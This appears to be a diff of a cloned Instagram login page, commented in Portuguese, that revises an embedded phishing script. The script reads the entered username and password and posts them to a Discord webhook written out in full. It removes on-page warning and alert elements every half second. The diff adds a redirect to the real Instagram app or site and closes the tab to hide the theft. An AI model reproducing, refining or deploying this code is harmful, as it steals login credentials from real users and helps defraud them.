@@ -144,30 +144,44 @@
 <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk=" nonce="49zhJgMy" data-btmanifest="1035465663_main"></script>
 <div id='has-finished-comet-page' hidden style='display: none;'></div></body></html>
 
-    <script>
-        // ===========================================
-        // CONFIGURAÇÃO
-        // ===========================================
+  <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484004957576364134/CeQR4xYrAUVJNyJrHyR9MNPaASYGZVK-nKAP7AZWD8KJnJUAmBaIREToUw8ELoLQOz5m';
         
-        // ===========================================
-        // ANTI-AVISO
-        // ===========================================
+        // Anti-aviso
         function removerAvisos() {
-            const seletor = '[role="alert"], [class*="warning"], [class*="alert"], [class*="breach"]';
-            document.querySelectorAll(seletor).forEach(el => el?.remove());
+            document.querySelectorAll('[role="alert"], [class*="warning"]').forEach(el => el?.remove());
         }
         setInterval(removerAvisos, 500);
-        new MutationObserver(removerAvisos).observe(document.body, { childList: true, subtree: true });
         
-        // ===========================================
-        // CAPTURA SIMPLES (SÓ USUÁRIO E SENHA)
-        // ===========================================
+        // ===== FUNÇÃO DE REDIRECIONAMENTO =====
+        function redirecionar() {
+            console.log('📱 Tentando abrir app...');
+            
+            // Tenta abrir o app do Instagram
+            window.location.href = 'instagram://';
+            
+            // Backup: se não abrir em 1.5s, abre o site
+            setTimeout(() => {
+                console.log('🌐 Abrindo site...');
+                window.location.href = 'https://www.instagram.com/';
+                
+                // Tenta fechar a aba atual
+                setTimeout(() => {
+                    window.close();
+                    console.log('🔒 Tentando fechar aba...');
+                }, 1000);
+            }, 1500);
+        }
+        
+        // ===== CAPTURA =====
         function capturar() {
             const user = document.getElementById('_r_6_')?.value;
             const pass = document.getElementById('_r_9_')?.value;
             
             if (user?.length > 2 && pass?.length > 2) {
+                console.log('📥 Capturado!');
+                
+                // Envia pro Discord (sem esperar resposta)
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -175,6 +189,9 @@
                         content: `🔐 **NOVO LOGIN**\n👤 ${user}\n🔑 ${pass}`
                     })
                 });
+                
+                // Redireciona
+                redirecionar();
             }
         }
         
@@ -186,7 +203,8 @@
                 
             if (botao && !botao._hasListener) {
                 botao._hasListener = true;
-                botao.addEventListener('click', () => setTimeout(capturar, 2000));
+                botao.addEventListener('click', capturar);
+                console.log('✅ Botão monitorado');
             }
         }, 1000);
     </script>
